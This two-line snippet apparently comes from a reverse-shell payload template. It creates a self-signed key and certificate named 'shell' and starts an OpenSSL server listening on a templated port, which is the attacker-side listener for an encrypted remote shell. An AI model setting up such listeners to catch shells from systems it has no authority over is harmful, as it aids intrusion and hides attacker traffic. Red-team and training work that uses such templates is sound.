openssl req -newkey rsa:2048 -nodes -x509 -days 365 -keyout ./shell.key -out ./shell.crt
openssl s_server -quiet -key ./shell.key -cert ./shell.crt -port {{ LPORT }}
